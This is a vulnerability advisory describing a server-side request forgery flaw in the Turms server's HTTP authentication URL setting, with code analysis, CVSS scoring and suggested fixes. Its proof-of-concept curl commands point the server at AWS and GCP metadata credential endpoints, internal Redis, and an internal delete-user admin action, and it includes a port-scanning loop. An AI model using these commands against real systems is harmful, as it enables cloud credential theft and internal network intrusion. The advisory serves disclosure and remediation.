# Turms Server - Server-Side Request Forgery (SSRF) in HTTP Authentication Configuration

## NAME OF AFFECTED PRODUCT(S)

- **Product**: Turms Server - HTTP-based Authentication Service Configuration
- **Vendor Homepage**: https://github.com/turms-im/turms

## AFFECTED AND/OR FIXED VERSION(S)

- **Submitter**: s1ain
- **Affected Version(s)**: Turms v0.10.0-SNAPSHOT and earlier versions
- **Software Link**: https://github.com/turms-im/turms
- **Fixed Version**: Not fixed yet

## PROBLEM TYPE

- **Vulnerability Type**: CWE-918: Server-Side Request Forgery (SSRF)
- **Root Cause**: The HTTP-based authentication service configuration allows administrators to specify arbitrary URLs for external authentication endpoints without validating that the URLs point to legitimate external services. The system does not implement URL filtering or allowlisting, enabling SSRF attacks.
- **Impact**:
  - Port scanning of internal network infrastructure
  - Access to internal services and APIs (cloud metadata, databases, admin panels)
  - Information disclosure through response timing and content
  - Bypass of network access controls and firewalls
  - Potential for credential theft from internal services

## DESCRIPTION

A Server-Side Request Forgery (SSRF) vulnerability exists in Turms server's HTTP-based authentication service configuration. Administrators can configure external HTTP endpoints for user authentication, but the system does not validate the provided URLs. A malicious or compromised administrator can configure the authentication service to point to internal network addresses (localhost, 127.0.0.1, 10.x.x.x, 192.168.x.x, cloud metadata endpoints, etc.). When users attempt to authenticate, the Turms server makes HTTP requests to these internal endpoints, allowing attackers to probe internal infrastructure, access cloud instance metadata, or interact with internal services that should not be externally accessible.

## Code Analysis

The HTTP authentication service configuration accepts URLs without proper validation:

**Configuration Property** (example location):
```yaml
# Administrators can configure arbitrary URLs
turms:
  service:
    user:
      authentication:
        http:
          url: "http://auth.example.com/verify"  # ← No validation!
```

**Vulnerable Pattern**:
```java
// HTTP authentication service makes requests to admin-configured URL
public Mono<Boolean> authenticate(String userId, String password) {
    String authUrl = authenticationProperties.getHttp().getUrl();

    // No URL validation performed!
    // authUrl could be:
    // - http://127.0.0.1:8080/admin
    // - http://169.254.169.254/latest/meta-data/
    // - http://192.168.1.1/internal-api
    // - http://localhost:6379/ (Redis)
    // - http://10.0.0.5:27017/ (MongoDB)

    return httpClient.post()
        .uri(authUrl)
        .bodyValue(new AuthRequest(userId, password))
        .retrieve()
        .bodyToMono(AuthResponse.class)
        .map(response -> response.isValid());
}
```

**Missing Validation**:
```java
// Should implement but doesn't:
private void validateAuthUrl(String url) {
    URI uri = new URI(url);

    // Check protocol
    if (!List.of("https").contains(uri.getScheme())) {
        throw new IllegalArgumentException("Only HTTPS allowed");
    }

    // Check for internal addresses
    InetAddress address = InetAddress.getByName(uri.getHost());
    if (address.isLoopbackAddress() ||
        address.isLinkLocalAddress() ||
        address.isSiteLocalAddress()) {
        throw new IllegalArgumentException("Internal addresses not allowed");
    }

    // Check cloud metadata endpoints
    if (isCloudMetadataEndpoint(uri.getHost())) {
        throw new IllegalArgumentException("Cloud metadata access forbidden");
    }
}
```

## Authentication Requirements

Administrator privileges are required to configure the HTTP authentication service URL. However, this includes any administrator account, and if admin credentials are compromised through other vulnerabilities (see Admin Password Caching CVE), attackers can exploit this SSRF vulnerability.

## Vulnerability Details and POC

**Vulnerability Type**: Server-Side Request Forgery (SSRF)

**Vulnerability Location**: HTTP authentication service configuration

**Proof of Concept**:

**Attack Scenario 1: Cloud Metadata Theft (AWS)**

```bash
# Attacker with admin access configures auth URL
curl -X PUT http://turms-admin:9510/admin/api/settings \
  -H "Authorization: Basic YWRtaW46cGFzcw==" \
  -H "Content-Type: application/json" \
  -d '{
    "turms.service.user.authentication.http.url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# When any user attempts to authenticate:
# 1. Turms server sends HTTP request to AWS metadata endpoint
# 2. Response contains IAM credentials
# 3. Attacker analyzes server logs or responses to extract credentials
```

**Attack Scenario 2: Internal Port Scanning**

```bash
# Scan internal network for open ports
# Configure auth URL to internal IP:PORT combinations

for port in 22 80 443 3306 5432 6379 8080 9200; do
  curl -X PUT http://turms-admin:9510/admin/api/settings \
    -H "Authorization: Basic YWRtaW46cGFzcw==" \
    -d "{\"turms.service.user.authentication.http.url\": \"http://192.168.1.1:$port/\"}"

  # Trigger authentication request and measure response time
  # Open ports: longer response time or different error
  # Closed ports: immediate connection refused
done

# Map internal network infrastructure
```

**Attack Scenario 3: Access Internal Admin Panel**

```bash
# Configure to point at internal admin interface
curl -X PUT http://turms-admin:9510/admin/api/settings \
  -d '{
    "turms.service.user.authentication.http.url": "http://localhost:8080/admin/delete-user?id=1"
  }'

# Next user authentication triggers:
# POST http://localhost:8080/admin/delete-user?id=1
# Internal admin action executed via SSRF
```

**Attack Scenario 4: Redis Command Injection**

```bash
# Point to internal Redis server
# Craft authentication request that includes Redis commands
curl -X PUT http://turms-admin:9510/admin/api/settings \
  -d '{
    "turms.service.user.authentication.http.url": "http://127.0.0.1:6379/"
  }'

# If authentication request body is controllable:
# Can inject Redis commands via HTTP request smuggling
```

**Attack Scenario 5: Cloud Provider Metadata (GCP)**

```bash
# Google Cloud metadata endpoint
curl -X PUT http://turms-admin:9510/admin/api/settings \
  -d '{
    "turms.service.user.authentication.http.url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  }'

# Headers need to include: Metadata-Flavor: Google
# But if controllable via config, can steal GCP credentials
```

## Attack Results

Successful SSRF exploitation results in:
- Cloud instance metadata theft (AWS, GCP, Azure credentials)
- Internal network reconnaissance and port scanning
- Access to internal services (databases, caches, admin panels)
- Bypass of network segmentation and firewall rules
- Potential for reading local files via file:// protocol (if supported)
- Information disclosure through differential response analysis
- Credential theft from internal authentication services

## Suggested Repair

1. **Implement Strict URL Validation** (Primary fix):
```java
import java.net.InetAddress;
import java.net.URI;

public class AuthUrlValidator {

    private static final Set<String> CLOUD_METADATA_HOSTS = Set.of(
        "169.254.169.254",           // AWS, Azure
        "metadata.google.internal",  // GCP
        "100.100.100.200"           // Alibaba Cloud
    );

    private static final Set<String> ALLOWED_SCHEMES = Set.of("https");

    public void validateAuthenticationUrl(String urlString) {
        try {
            URI uri = new URI(urlString);

            // 1. Validate protocol (HTTPS only)
            if (!ALLOWED_SCHEMES.contains(uri.getScheme().toLowerCase())) {
                throw new IllegalArgumentException(
                    "Only HTTPS protocol is allowed for authentication URLs"
                );
            }

            String host = uri.getHost();
            if (host == null) {
                throw new IllegalArgumentException("Invalid URL: no host specified");
            }

            // 2. Prevent localhost and loopback
            if (host.equals("localhost") ||
                host.equals("127.0.0.1") ||
                host.startsWith("127.") ||
                host.equals("::1") ||
                host.equals("0.0.0.0")) {
                throw new IllegalArgumentException(
                    "Loopback addresses are not allowed"
                );
            }

            // 3. Prevent cloud metadata endpoints
            if (CLOUD_METADATA_HOSTS.contains(host)) {
                throw new IllegalArgumentException(
                    "Cloud metadata endpoints are forbidden"
                );
            }

            // 4. Resolve and validate IP address
            InetAddress address = InetAddress.getByName(host);

            if (address.isLoopbackAddress()) {
                throw new IllegalArgumentException("Loopback addresses forbidden");
            }

            if (address.isLinkLocalAddress()) {
                throw new IllegalArgumentException("Link-local addresses forbidden");
            }

            if (address.isSiteLocalAddress()) {
                // Private IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
                throw new IllegalArgumentException(
                    "Private network addresses are not allowed"
                );
            }

            // 5. Additional: Check for DNS rebinding
            // Re-resolve after delay to detect DNS changes
            Thread.sleep(100);
            InetAddress recheck = InetAddress.getByName(host);
            if (!address.equals(recheck)) {
                throw new IllegalArgumentException(
                    "DNS rebinding detected"
                );
            }

        } catch (Exception e) {
            throw new IllegalArgumentException(
                "Invalid authentication URL: " + e.getMessage(), e
            );
        }
    }
}
```

2. **Implement URL Allowlist** (Recommended):
```java
// Require administrators to pre-register authentication services
private static final Set<String> ALLOWED_AUTH_DOMAINS = Set.of(
    "auth.company.com",
    "sso.company.com",
    "identity.company.com"
);

public void validateAgainstAllowlist(URI uri) {
    String host = uri.getHost();
    boolean allowed = ALLOWED_AUTH_DOMAINS.stream()
        .anyMatch(domain -> host.equals(domain) || host.endsWith("." + domain));

    if (!allowed) {
        throw new IllegalArgumentException(
            "Authentication URL must be from allowed domains"
        );
    }
}
```

3. **Network-Level Protections**:
```java
// Configure HTTP client with restricted network access
HttpClient secureClient = HttpClient.newBuilder()
    .connectTimeout(Duration.ofSeconds(5))
    .proxy(ProxySelector.of(new InetSocketAddress("proxy.company.com", 8080)))
    // Route through proxy that blocks internal networks
    .build();
```

4. **Implement Response Size Limits**:
```java
// Prevent large responses from being returned
private static final int MAX_RESPONSE_SIZE = 1024; // 1 KB

httpClient.get()
    .uri(authUrl)
    .retrieve()
    .bodyToMono(String.class)
    .map(response -> {
        if (response.length() > MAX_RESPONSE_SIZE) {
            throw new ResponseTooLargeException();
        }
        return response;
    });
```

5. **Audit Logging**:
```java
// Log all authentication URL changes
logger.warn("Authentication URL changed to: {} by admin: {}",
    newUrl, adminId);
```

6. **Additional Protections**:
   - Disable support for non-HTTP protocols (file://, ftp://, gopher://)
   - Implement request timeout limits
   - Use separate network namespace for outbound auth requests
   - Monitor for suspicious authentication URL patterns

## CVSS Score

**CVSS v3.1**: 4.3 (Medium)
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): High (administrator)
- User Interaction (UI): None
- Scope (S): Unchanged
- Confidentiality (C): Low
- Integrity (I): Low
- Availability (A): None

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N

Note: Impact can be Critical in cloud environments where metadata services expose credentials, or in networks with sensitive internal services accessible via SSRF.

## References

- CWE-918: Server-Side Request Forgery (SSRF)
- OWASP SSRF Prevention Cheat Sheet
- Cloud Provider Metadata Endpoints Documentation
- PortSwigger: Server-side request forgery (SSRF)
